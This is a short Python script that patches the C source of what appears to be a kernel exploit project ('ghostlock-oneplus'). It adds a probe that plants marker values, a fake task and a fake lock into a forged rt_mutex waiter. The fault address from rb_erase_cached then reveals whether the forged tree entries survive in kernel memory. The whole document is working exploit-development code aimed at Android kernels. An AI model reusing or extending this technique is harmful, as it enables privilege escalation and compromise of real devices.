#!/usr/bin/env python3
"""patch_nodeprobe.py

SSOPT_NODEPROBE=1: paint waiter tree_entry bằng 3 MARKER PHÂN BIỆT + lock hợp lệ:
  buf[0x10] (waiter+0x00 parent_color) = 0x1a2b00000010
  buf[0x18] (waiter+0x08 rb_right)      = 0x1a2b00000018
  buf[0x20] (waiter+0x10 rb_left)       = 0x1a2b00000020
  buf[0x40] task, buf[0x48] lock        = fake_task / fake_lock  (để qua [5])
=> rb_erase_cached: RB_EMPTY false (marker != waiter), child=0x1a2b..18, tmp=0x1a2b..20
   => case 3 => `ldr x10,[child,#16]` => FAULT VA = 0x1a2b00000028
=> Nếu dump cho VA = 0x1a2b00000028  => paint SỐNG SÓT tới [7]
   Nếu VA = rác / khác          => word tương ứng đã bị CLOBBER.
"""
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()
old = """    } else if (env_flag("SSOPT_EMPTY", 0) && ssopt_leaked_waiter) {"""
new = """    } else if (env_flag("SSOPT_NODEPROBE", 0)) {
      /* decisive probe: are the painted tree_entry words still there at [7]? */
      put64(buf, 0x10, 0x1a2b00000010ULL);
      put64(buf, 0x18, 0x1a2b00000018ULL);
      put64(buf, 0x20, 0x1a2b00000020ULL);
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task
                                                 : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    } else if (env_flag("SSOPT_EMPTY", 0) && ssopt_leaked_waiter) {"""
assert s.count(old) == 1, ("nodeprobe", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: SSOPT_NODEPROBE (3 distinct markers in tree_entry)")
